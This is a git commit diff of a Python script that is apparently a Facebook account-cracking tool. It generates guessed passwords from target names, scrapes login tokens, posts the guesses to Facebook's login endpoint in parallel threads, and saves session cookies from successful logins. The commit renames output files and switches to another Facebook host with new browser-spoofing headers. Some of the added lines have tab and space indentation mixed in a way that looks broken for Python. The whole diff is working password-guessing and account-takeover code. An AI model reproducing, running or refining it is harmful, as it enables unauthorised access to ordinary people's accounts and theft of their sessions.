75f996baea6899339215cb9f16e507bc23dd5216
XR-SHIHAB-999 <141644163+XR-SHIHAB-999@users.noreply.github.com>
2023-09-07 00:33:37 +0600

    Add files via upload

--- C-788.py
+++ C-788.py
@@ -197,7 +197,7 @@ def gml():
             pwx = [kode,kodex,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+guru,kodex+'123',kodex+'1234',kodex+'12345']
             yaari.submit(rcrack1,uid,pwx,tl)
     print(' [+] \033[38;5;46mCrack process has been completed')
-    print(' [+] \033[38;5;46mIds saved in Tanvir-ok.txt,Tanvir-cp.txt')
+    print(' [+] \033[38;5;46mIds saved in SHIHAB-ok.txt,SHIHAB-cp.txt')
 def rcrack1(uid,pwx,tl):
     global loop
     global cps
@@ -209,7 +209,7 @@ def rcrack1(uid,pwx,tl):
             session = requests.Session()
             sys.stdout.write('\r[\033[1;92m[\033[38;5;46mBOSS__SHIHAB]\033[1;97m] > [%s/%s] > [OK\033[1;97m:-\033[1;92m%s\033[1;97m] - [CP\033[1;97m:-\033[1;91m%s\033[1;97m] \r'%(loop,tl,len(oks),len(cps))),
             sys.stdout.flush()
-            free_fb = session.get('https://mbasic.facebook.com').text
+            free_fb = session.get('https://x.facebook.com').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -220,24 +220,29 @@ def rcrack1(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            header_freefb =  {'authority': 'mbasic.facebook.com',
+            header_freefb =  {'authority': 'x.facebook.com',
             'method':'GET',
             'path':'/login/device-based/regular/login/?refsrc=deprecated&lwv=101&ref=dbl',
             'scheme':'https',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-            'accept-language': 'en-US,en;q=0.9',
-            'cache-control': 'max-age=0',
-            'referer': 'https://mbasic.facebook.com/',
-            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Opera";v="96"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'sec-fetch-dest': 'document',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-user': '?1',
-            'upgrade-insecure-requests': '1',
-            'user-agent': pro }
-            lo = session.post('https://mbasic.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
+  		  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  		  'accept-language': 'en-US,en;q=0.9',
+ 		   'cache-control': 'max-age=0',
+	        'dpr': '3',
+  		  'sec-ch-prefers-color-scheme': 'dark',
+		    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+  		  'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.70"',
+ 		   'sec-ch-ua-mobile': '?0',
+  		  'sec-ch-ua-model': '""',
+  		  'sec-ch-ua-platform': '"Linux"',
+ 		   'sec-ch-ua-platform-version': '""',
+		    'sec-fetch-dest': 'document',
+ 		   'sec-fetch-mode': 'navigate',
+  		  'sec-fetch-site': 'none',
+		    'sec-fetch-user': '?1',
+  	     'upgrade-insecure-requests': '1',
+		    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36',
+   	    'viewport-width': '980',}
+            lo = session.post('https://x.facebook.com/login/device-based/regular/login/?refsrc=deprecated&lwv=100&refid=8',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
